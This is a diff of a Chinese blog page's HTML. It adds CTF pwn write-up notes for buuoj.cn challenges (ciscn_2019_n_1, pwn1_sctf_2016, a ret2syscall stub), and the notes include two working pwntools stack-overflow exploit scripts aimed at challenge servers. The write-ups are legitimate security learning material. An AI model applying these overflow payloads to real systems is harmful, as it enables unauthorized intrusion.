@@ -7,12 +7,14 @@
     <meta name="keywords" content="PWN题记录, あなたがいること.">
     <meta name="description" content="前言研一上学期的课程终于结束，自由学习时间芜湖~
 PWN上路！
-题目Ret2TextRip来源: buuoj.cn
+题目常规自带后门
+Ret2Text
+变量覆盖
+
+Rip来源: buuoj.cn
 总结利用原理: 栈溢出
 利用方式: 栈溢出跳转到代码段自带参数的systemcall 
-细节溢出点：gets函数
-
-直接目测">
+细节溢出">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -368,14 +370,14 @@ PWN上路！
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2022-01-06
+                    2022-01-07
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    504
+                    921
                 </div>
                 
 
@@ -402,7 +404,11 @@ PWN上路！
             <div id="articleContent">
                 <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>研一上学期的课程终于结束，自由学习时间芜湖~</p>
 <p>PWN上路！</p>
-<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="Ret2Text"><a href="#Ret2Text" class="headerlink" title="Ret2Text"></a>Ret2Text</h2><h3 id="Rip"><a href="#Rip" class="headerlink" title="Rip"></a>Rip</h3><p>来源: buuoj.cn</p>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="常规自带后门"><a href="#常规自带后门" class="headerlink" title="常规自带后门"></a>常规自带后门</h2><ul>
+<li>Ret2Text</li>
+<li>变量覆盖</li>
+</ul>
+<h3 id="Rip"><a href="#Rip" class="headerlink" title="Rip"></a>Rip</h3><p>来源: buuoj.cn</p>
 <h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>利用原理: 栈溢出</p>
 <p>利用方式: 栈溢出跳转到代码段自带参数的systemcall </p>
 <h4 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h4><p>溢出点：gets函数</p>
@@ -482,17 +488,82 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 
 
 
-<h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><h4 id="细节-2"><a href="#细节-2" class="headerlink" title="细节"></a>细节</h4><p>程序主逻辑如下</p>
+<h3 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h3><h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>利用原理: 栈溢出</p>
+<p>利用方式: 覆盖关键变量</p>
+<h4 id="细节-2"><a href="#细节-2" class="headerlink" title="细节"></a>细节</h4><p>程序主逻辑如下</p>
 <p><img src="https://raw.githubusercontent.com/Luluting/Bed/Little/img/image-20220106231727111.png"></p>
 <p>我们的目标就是通过溢出v1数组将变量v2覆盖为对应的浮点数</p>
 <p>浮点数数据如下</p>
 <p>dword_4007F4    dd 41348000h</p>
 <p>栈帧如下</p>
 <p><img src="https://raw.githubusercontent.com/Luluting/Bed/Little/img/image-20220106232211913.png"></p>
-<p>溢出v2只需要填充30个字符，然后将正确的值给v2即可</p>
+<p>溢出v2只需要填充44个字符，然后跟随正确的值覆盖v2即可</p>
+<p>所以EXP如下：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment">#context.update(arch = 'i386', os = 'linux', timeout = 1) </span>
+context<span class="token punctuation">.</span>os<span class="token operator">=</span><span class="token string">'linux'</span>
+context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
+context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
+
+local<span class="token operator">=</span><span class="token number">0</span>
+<span class="token keyword">if</span> local<span class="token punctuation">:</span> 
+    p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./ciscn_2019_n_1'</span><span class="token punctuation">)</span> 
+<span class="token keyword">else</span><span class="token punctuation">:</span> 
+    p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">25812</span><span class="token punctuation">)</span>
+
+system_addr<span class="token operator">=</span><span class="token number">0x40060D</span>
+
+payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">44</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x41348000</span><span class="token punctuation">)</span>
+
+<span class="token comment">#gdb.attach(p)</span>
+<span class="token comment">#pause()</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h3><h4 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h4><p>利用原理：栈溢出</p>
+<p>利用方法：利用字符串处理覆盖地址</p>
+<h4 id="细节-3"><a href="#细节-3" class="headerlink" title="细节"></a>细节</h4><p>32位程序</p>
+<p>利用地址在0x08048F0D或者0x08048F13</p>
+<p>程序逻辑是通过fgets获取输入 最大32个字节 输入的字符串会进行处理</p>
+<p>主函数栈帧输入的偏移为<code>-0x3C</code> 返回地址在<code>+4</code> </p>
+<p>所以需要填充的长度为<code>0x40</code> 即64个字节</p>
+<p>通常来说无法直接溢出覆盖 这时候看字符串的处理方式</p>
+<p>将输入中所有的<code>I</code>替换为 <code>you</code></p>
+<p>所以利用方法：</p>
+<p>输入中1个字节最大能凑3个字节 预留最后4个字节用于覆盖</p>
+<p>则最大可以覆盖的范围为<code>(32-4)*3 &gt; 64</code>所以可以成功</p>
+<p><code>64 = 3 * 21 + 1</code></p>
+<p>所以输入中有21个<code>I</code>加其他字符然后进行覆盖即可</p>
+<p>所以EXP如下</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment">#context.update(arch = 'i386', os = 'linux', timeout = 1) </span>
+context<span class="token punctuation">.</span>os<span class="token operator">=</span><span class="token string">'linux'</span>
+context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
+context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
+
+local<span class="token operator">=</span><span class="token number">0</span>
+<span class="token keyword">if</span> local<span class="token punctuation">:</span> 
+    p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./pwn1_sctf_2016'</span><span class="token punctuation">)</span> 
+<span class="token keyword">else</span><span class="token punctuation">:</span> 
+    p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">29328</span><span class="token punctuation">)</span>
+
+system_addr<span class="token operator">=</span><span class="token number">0x08048F13</span>
+<span class="token comment"># 64 = 3*21+1</span>
+payload <span class="token operator">=</span> <span class="token string">b'I'</span><span class="token operator">*</span><span class="token number">21</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
+<span class="token comment"># gdb.attach(p)</span>
+<span class="token comment"># pause()</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>题目来源:bamboofox 中的 ret2syscall </p>
+<h4 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h4><p>看栈帧和实际溢出位置不一致</p>
 <h1 id="技巧总结"><a href="#技巧总结" class="headerlink" title="技巧总结"></a>技巧总结</h1><h2 id="调试交互方式"><a href="#调试交互方式" class="headerlink" title="调试交互方式"></a>调试交互方式</h2><ul>
-<li><p>源码方法</p>
-<p>在发送payload之前先使用pause()</p>
+<li><p>调试时需要输入payload通常含有一些不可打印字符 直接复制粘贴不好使</p>
+<p>则在发送payload之前先使用pause()</p>
 <p>在gdb下完断点后继续执行</p>
 </li>
 </ul>
